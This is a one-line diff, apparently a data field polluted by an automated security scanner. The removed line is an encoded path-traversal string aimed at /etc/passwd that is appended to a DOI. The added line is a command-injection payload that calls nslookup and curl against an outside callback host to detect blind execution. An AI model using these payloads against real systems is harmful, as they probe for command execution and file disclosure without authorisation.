@@ -1,1 +1,1 @@
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.1088/0953-8984/16/27/003
+&(nslookup -q=cname hitkphuilmpsh28db0.bxss.me||curl hitkphuilmpsh28db0.bxss.me)&'\"`0&(nslookup -q=cname hitkphuilmpsh28db0.bxss.me||curl hitkphuilmpsh28db0.bxss.me)&`'
